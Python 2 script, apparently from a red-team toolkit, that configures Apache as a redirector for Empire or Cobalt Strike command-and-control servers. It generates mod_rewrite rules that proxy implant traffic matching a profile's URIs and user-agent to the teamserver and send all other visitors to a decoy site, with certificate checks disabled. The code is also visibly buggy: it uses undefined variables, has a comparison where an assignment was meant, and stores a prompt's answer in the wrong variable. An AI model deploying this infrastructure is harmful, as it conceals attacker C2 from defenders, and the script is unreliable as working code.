#!/usr/bin/env python
# -*- coding: utf-8 -*-

############################################################################################
# sleight.py:   Empire HTTP(S) C2 redirector setup script
# Author:   VIVI | <Blog: thevivi.net> | <Twitter: @_theVIVI> | <Email: gabriel@thevivi.net>
############################################################################################

import subprocess
import argparse
import sys
import re
import os

# Console colours
W = '\033[0m'     #normal
R = '\033[1;31m'  #red
T = '\033[1;93m'  #tan
G = '\033[32m'    #green
LG = '\033[1;32m' #light green

empire_htaccess_template = '''
RewriteEngine On
RewriteCond %{{REQUEST_URI}} ^/({})/?$
RewriteCond %{{HTTP_USER_AGENT}} ^{}?$
RewriteRule ^.*$ http://{c2server}:{c2port}%{{REQUEST_URI}} [P]
RewriteRule ^.*$ {destination}/? [L,R=302]
'''

cobaltstrike_htaccess_template = '''
########################################
## .htaccess START 
RewriteEngine On

## (Optional)
## Scripted Web Delivery 
## Uncomment and adjust as needed
#RewriteCond %{{REQUEST_URI}} ^/css/style1.css?$
#RewriteCond %{{HTTP_USER_AGENT}} ^$
#RewriteRule ^.*$ "http://{c2server}:{c2port}%{{REQUEST_URI}}" [P,L]

## Default Beacon Staging Support (/1234)
RewriteCond %{{REQUEST_URI}} ^/..../?$
RewriteCond %{{HTTP_USER_AGENT}} "{ua}"
RewriteRule ^.*$ "{c2server}:{c2port}%{{REQUEST_URI}}" [P,L]

## C2 Traffic (HTTP-GET, HTTP-POST, HTTP-STAGER URIs)
## Logic: If a requested URI AND the User-Agent matches, proxy the connection to the Teamserver
## Consider adding other HTTP checks to fine tune the check.  (HTTP Cookie, HTTP Referer, HTTP Query String, etc)
## Refer to http://httpd.apache.org/docs/current/mod/mod_rewrite.html
## Profile URIs
RewriteCond %{{REQUEST_URI}} ^({uris})$
## Profile UserAgent
RewriteCond %{{HTTP_USER_AGENT}} "{ua}"
RewriteRule ^.*$ "{c2server}:{c2port}%{{REQUEST_URI}}" [P,L]

## Redirect all other traffic here
RewriteRule ^.*$ {destination}/? [L,R=302]

## .htaccess END
########################################
'''

def parse_args():

    # Arguments
    parser = argparse.ArgumentParser(description='Empire' +
        ' HTTP(S) C2 redirector setup script')

    parser.add_argument(
        '-c',
        '--commProfile',
        help='Path to Empire Communication Profile',
        required=True
    )

    parser.add_argument(
        '-r',
        '--redirectDomain',
        help='Domain bad traffic will be redirected to.',
        required=True
    )

    parser.add_argument(
        '-p',
        '--port',
        help='Port that the remote C2 is listening on',
        required=False
    )

    parser.add_argument(
        '-i',
        '--ip',
        help='IP Address of the remote C2 listener',
        required=False
    )

    parser.add_argument(
        '-m',
        '--modeHTTPS',
        help='HTTPS Listener for redirector? [y/N]',
        required=False
    )

    parser.add_argument(
        '-t',
        '--myDomain',
        help='Domain name for redirector',
        required=False
    )
    parser.add_argument(
        '-q',
        '--proceed',
        help='Proceed with configuration of HTTPS Redirector and Cert Deployment [y/N]',
        required=False
    )
    parser.add_argument(
        '-z',
        '--c2',
        help='C2 type: Values are \'cs\' or \'em\'',
        required=False
    )

    return parser.parse_args()

def shutdown():

   # User shutdown
   print '\n' + R + '[!]' + W + ' Exiting.'
   sys.exit()

def convert_profile():
	
    # Get LHOST, LPORT and redirect site
    if args.ip:
 		LHOST = args.ip
    else:
        LHOST = raw_input(
        '\n' + G + '[+]' + W + ' Empire C2 LHOST: ')
        while LHOST == '':
			LHOST = raw_input("[-] Empire C2 LHOST: ")

    if args.c2:
 		c2System = args.c2
 		if c2System != 'cs':
			if c2System != 'em':
				c2System == 'em'
    else:
        LHOST = raw_input(
        '\n' + G + '[+]' + W + ' C2 System (cs or em): ')
        while LHOST == '':
			LHOST = raw_input("[-] C2 System (cs or em): ")

    if args.port:
		LPORT = args.port
    else:
        LPORT = raw_input(
        G + '[+]' + W + ' Empire C2 LPORT: ')
        while LPORT == '':
			LPORT = raw_input("[-] Empire C2 LPORT: ")

    if args.modeHTTPS:
		HTTPS = args.modeHTTPS
    else:
        HTTPS = raw_input(
        G + '[+]' + W + ' HTTPS listener? [y/N]: ')
        while HTTPS == '':
			HTTPS = raw_input("[-] HTTPS listener? [y/N]: ")

    if args.redirectDomain:
        redirect = args.redirectDomain
    else:
        redirect = raw_input(
        G + '[+]' + W + ' Redirect Site URL: ')
        while redirect == '':
			redirect = raw_input("[-] Redirect Site URL: ")

    commProfile = open(args.commProfile, 'r')
    cp_file = commProfile.read()
    commProfile.close()
    
    if c2System == 'cs':
	##CS Start
	# Search Strings
		ua_string  = "set useragent"
		http_get   = "http-get"
		http_post  = "http-post"
		set_uri    = "set uri"

		http_stager = "http-stager"
		set_uri_86 = "set uri_x86"
		set_uri_64 = "set uri_x64"

		# Errors
		errorfound = False
		errors = "\n##########\n[!] ERRORS\n"

		# Get UserAgent
		if cp_file.find(ua_string) == -1:
			ua = ""
			errors += "[!] User-Agent Not Found\n"
			errorfound = True
		else:
			ua_start = cp_file.find(ua_string) + len(ua_string)
			ua_end   = cp_file.find("\n",ua_start)
			ua       = cp_file[ua_start:ua_end].strip()[1:-2]


		# Get HTTP GET URIs
		http_get_start = cp_file.find(http_get)
		if cp_file.find(set_uri) == -1: 
			get_uri = ""
			errors += "[!] GET URIs Not Found\n"
			errorfound = True
		else:
			get_uri_start  = cp_file.find(set_uri, http_get_start) + len(set_uri)
			get_uri_end    = cp_file.find("\n", get_uri_start)
			get_uri        = cp_file[get_uri_start:get_uri_end].strip()[1:-2]

		# Get HTTP POST URIs
		http_post_start = cp_file.find(http_post)
		if cp_file.find(set_uri) == -1:
			post_uri = ""
			errors += "[!] POST URIs Not Found\n"
			errorfound = True
		else:
			post_uri_start  = cp_file.find(set_uri, http_post_start) + len(set_uri)
			post_uri_end    = cp_file.find("\n", post_uri_start)
			post_uri        = cp_file[post_uri_start:post_uri_end].strip()[1:-2]

		# Get HTTP Stager URIs x86
		http_stager_start = cp_file.find(http_stager)
		if cp_file.find(set_uri_86) == -1:
			stager_uri_86 = ""
			errors += "[!] x86 Stager URIs Not Found\n"
			errorfound = True
		else:
			stager_uri_start  = cp_file.find(set_uri_86, http_stager_start) + len(set_uri_86)
			stager_uri_end    = cp_file.find("\n", stager_uri_start)
			stager_uri_86     = cp_file[stager_uri_start:stager_uri_end].strip()[1:-2]

		# Get HTTP Stager URIs x64
		http_stager_start = cp_file.find(http_stager)
		if cp_file.find(set_uri_64) == -1:
			stager_uri_64 = ""
			errors += "[!] x64 Stager URIs Not Found\n"
			errorfound = True
		else:
			stager_uri_start  = cp_file.find(set_uri_64, http_stager_start) + len(set_uri_64)
			stager_uri_end    = cp_file.find("\n", stager_uri_start)
			stager_uri_64     = cp_file[stager_uri_start:stager_uri_end].strip()[1:-2]

		# Create URIs list
		get_uris  = get_uri.split()
		post_uris = post_uri.split()
		stager86_uris = stager_uri_86.split()
		stager64_uris = stager_uri_64.split()
		uris = get_uris + post_uris + stager86_uris + stager64_uris

		# Create UA in modrewrite syntax. No regex needed in UA string matching, but () characters must be escaped
		ua_string = ua.replace('(','\(').replace(')','\)')

		# Create URI string in modrewrite syntax. "*" are needed in REGEX to support GET parameters on the URI
		uris_string = ".*|".join(uris) + ".*"
		
    if c2System == 'em':
	## Empire Start 
		profile = re.sub(r'(?m)^\#.*\n?', '', cp_file).strip('\n')
		# GET request URI(s)
		uri_string = profile.split('|')[0]
		uri = uri_string.replace('\"','').replace(',','|').replace(',','|').strip('/')
		uri = uri.replace('|/','|')

		# User agent
		user_agent_string = profile.split('|')[1]
		user_agent = user_agent_string.replace(' ','\ ').replace('.','\.').replace('(','\(').replace(')','\)')
		user_agent = user_agent.rstrip('\"')
	## Empire End

    # HTTPS rules
    if HTTPS == 'y':
    	htaccess_template_https = htaccess_template.replace('http', 'https', 1)
    	if c2System == 'cs':
			rules = (cobaltstrike_htaccess_template.format(uris=uris_string,ua=ua_string,c2server=LHOST,c2port=LPORT,destination=redirect))
        else:
			rules = (empire_htaccess_template.format(uri,user_agent,c2server=LHOST,c2port=LPORT,destination=redirect))
    else:
    	if c2System == 'cs':
			rules = (cobaltstrike_htaccess_template.format(uris=uris_string,ua=ua_string,c2server=LHOST,c2port=LPORT,destination=redirect))
        else:
			rules = (empire_htaccess_template.format(uri,user_agent,c2server=LHOST,c2port=LPORT,destination=redirect))

    print LG + '\n[!]' + W + ' mod_rewrite rules generated.'
    print rules
    return rules

def get_apache():

    # Install Apache
    if not os.path.isdir('/etc/apache2/'):
		if args.install == 'y':
			install = 'y'
		else:
			install = raw_input(
			(G + '[+]' + W + ' Apache installation not found' +
			 ' in /etc/apache2/. Install now? [y/N] ')
        )
		if install == 'y':
			print '\n' + T + '[*]' + W + ' Installing Apache...\n'
			subprocess.call(['apt-get', 'update','-y'])
			subprocess.call(['apt-get','install','apache2','-y'])
			print LG + '\n[!]' + W + ' Apache installed.'
		else:
			sys.exit((R + '[!]' + W + ' Exiting. Apache' +
			         ' not installed.'))

def get_https_cert():

    # Generate HTTPS certificate
    print '\n' + T + '[*]' + W + ' Generating Let\'s Encrypt HTTPS certificate...'

    if not args.myDomain:
        domain = raw_input(
			'\n' + G + '[+]' + W + ' Redirector domain (e.g. example.com): ')
        while domain == '':
			domain = raw_input("[-] Redirector domain (e.g. example.com): ")
    else:
		domain = args.myDomain
    print '\n' + T + '[*]' + W + ' Runnning certbot. This might take some time...\n'
    if not os.path.isfile("./certbot-auto"):
    	subprocess.call(['wget', 'https://dl.eff.org/certbot-auto'])
    subprocess.call(['chmod', 'a+x', './certbot-auto'])
    subprocess.call(['service', 'apache2', 'stop'])
# TODO: add sub domain enumeration here, so news,images,www,static can be fed as a CLI arg and the array is parsed as multiple -d options.
    if args.proceed:
        subprocess.call(['./certbot-auto', 'certonly', '--standalone', '-d', \
    	str(domain), '-d', 'www.'+str(domain), '--register-unsafely-without-email', '--agree-tos', '--non-interactive'])

    else:
        subprocess.call(['./certbot-auto', 'certonly', '--standalone', '-d', \
    	str(domain), '-d', 'www.'+str(domain)])

    cert_dir = '/etc/letsencrypt/live/'+str(domain)
    if not os.path.isdir(str(cert_dir)):
    	print '\n' + R + '[!]' + W + ' HTTPS certificate for ' \
    	+ T + str(domain) + W + ' not generated.'
    	sys.exit((R + '[!]' + W + ' Exiting. HTTPS certificate' +
    		' generation failed.'))
    else:
		print LG + '\n[!]' + W + ' HTTPS certificate for ' \
    	+ T + str(domain) + W + ' successfully generated.'

    return domain

def mod_rewrite_config(rules):

	# Backup Apache config file
	if not os.path.isfile("/etc/apache2/apache2.conf.bak"):
		print '\n' + T + '[*]' + W + ' Backing up Apache configuration file...'
		subprocess.call(['cp', '/etc/apache2/apache2.conf', '/etc/apache2/apache2.conf.bak'])

	# Edit Apache config file
	print T + '[*]' + W + ' Enabling mod_rewrite...\n'
	ac1 = open('/etc/apache2/apache2.conf', 'r')
	old_config = ac1.read()
	ac1.close()
	dir_tag = re.compile(r"/var/www/>.*?</Directory", flags=re.DOTALL)
	new_config = dir_tag.sub(lambda match: match.group(0).replace('None','All') ,old_config)
	ac2 = open('/etc/apache2/apache2.conf', 'w')
	ac2.write(new_config)
	ac2.close()

	# Enable mod_rewrite modules
	subprocess.call(['a2enmod', 'rewrite', 'proxy', 'proxy_http'])

	# HTTPS configuration
	f = re.split("\n", rules)
	if 'https' in f[4]:
		# Get cert
		domain = get_https_cert()
		# Enable HTTPS
		print '\n' + T + '[*]' + W + ' Enabling HTTPS...\n'
		subprocess.call(['a2enmod', 'ssl'])
		subprocess.call(['a2ensite', 'default-ssl.conf'])
		# Backup SSL config file
		if not os.path.isfile("/etc/apache2/sites-enabled/default-ssl.conf.bak"):
			print '\n' + T + '[*]' + W + ' Backing up SSL configuration file...'
			subprocess.call(['cp', '/etc/apache2/sites-enabled/default-ssl.conf', \
				'/etc/apache2/sites-enabled/default-ssl.conf.bak'])

		# Edit SSL config file
		ssl1 = open('/etc/apache2/sites-enabled/default-ssl.conf', 'r')
		old_config = ssl1.read()
		ssl1.close()

		ssl_settings = '''
		SSLEngine On
		# Enable Proxy
		SSLProxyEngine On
		# Trust Self-Signed Certificates
		SSLProxyVerify none
		SSLProxyCheckPeerCN off
		SSLProxyCheckPeerName off'''

		ssl_on_tag = re.compile(r"SSL Engine Switch:.*?A self-signed", flags=re.DOTALL)
		new_config = ssl_on_tag.sub(lambda match: \
			match.group(0).replace('SSLEngine on',str(ssl_settings)) ,old_config)

		cert_settings = '''#   SSLCertificateFile directive is needed.

		# Certificate files for {}
		#SSLCertificateFile      /etc/letsencrypt/live/{}/cert.pem
		SSLCertificateFile      /etc/letsencrypt/live/{}/fullchain.pem
		SSLCertificateKeyFile      /etc/letsencrypt/live/{}/privkey.pem

		#   Server Certificate Chain:'''.format(domain, domain, domain, domain)

		certs_tag = re.compile(r"#   SSLCertificateFile directive is needed..*?#   Server Certificate Chain:", \
			flags=re.DOTALL)
		new_config = certs_tag.sub(str(cert_settings) ,new_config, 1)

		ssl2 = open('/etc/apache2/sites-enabled/default-ssl.conf', 'w')
		ssl2.write(new_config)
		ssl2.close()

	# Restart Apache
	restart = subprocess.Popen(['service', 'apache2', 'restart'], \
		stdout=subprocess.PIPE,stderr=subprocess.PIPE)
	output,error = restart.communicate()
	print output,error

	if 'apache2.service failed' in str(error):
		print '\n' + R + '[!]' + W + ' mod_rewrite not enabled.'
		sys.exit((R + '[!]' + W + ' Exiting. mod_rewrite could not' +
			' not be enabled.'))
	else:
		print LG + '\n[!]' + W + ' mod_rewrite enabled.\n'

def write_rules(rules):

	# Write rules to .htaccess
	ruleset = str(rules).strip('\n')
	htaccess = open('/var/www/html/.htaccess', 'w')
	htaccess.write(ruleset)
	htaccess.close()
	subprocess.call(['chmod', '644', '/var/www/html/.htaccess'])
	print LG + '[!]' + W + ' mod_rewrite rules written to /var/www/html/.htaccess\n'
	subprocess.call(['ls', '-la', '/var/www/html/.htaccess'])

	# Restart Apache
	print '\n' + T + '[*]' + W + ' Restarting Apache...\n'
	subprocess.call(['service', 'apache2', 'restart'])
	print LG + '[!]' + W + ' Apache restarted.\n'

# Main section
if __name__ == "__main__":

	print """                         
	                       .------.
	    .------.           |A .   |
	    |A_  _ |    .------; / \  |
	    |( \/ )|-----. _   |(_ _) |
	    | \  / | /\  |( )  |  I  A|
	    |  \/ A|/  \ |___) |------'
	    `-----+'\  / | Y  A|
	          |  \/ A|-----'
	          `------'
	     ▄▄ ▝▜       ▝      ▐    ▗  
	    ▐▘ ▘ ▐   ▄▖ ▗▄   ▄▄ ▐▗▖ ▗▟▄ 
	    ▝▙▄  ▐  ▐▘▐  ▐  ▐▘▜ ▐▘▐  ▐  
	      ▝▌ ▐  ▐▀▀  ▐  ▐ ▐ ▐ ▐  ▐  
	    ▝▄▟▘ ▝▄ ▝▙▞ ▗▟▄ ▝▙▜ ▐ ▐  ▝▄ 
	                     ▖▐         
	                     ▝▘         
	"""

	# Parse args
	args = parse_args()
	
	# Root check
	if os.geteuid():
		sys.exit('\n' + R + '[!]' + W +
			' This script must be run as root')

	try:
		rules = convert_profile()
		if args.proceed:
			configure = args.proceed
		else:
			configure = raw_input(
			    G + '[+]' + W + ' Proceed with redirector setup?' +
			        ' [y/N] ')

		if configure == 'y':
			get_apache()
			mod_rewrite_config(rules)
			write_rules(rules)
		else:
			sys.exit((R + '[!]' + W + ' Exiting. Redirector' +
				' not configured.'))

		print LG + '[!] Setup complete!' + W
		print LG + '\n[!]' + W + ' You can now test your redirector.\n'

	except KeyboardInterrupt:
		shutdown()
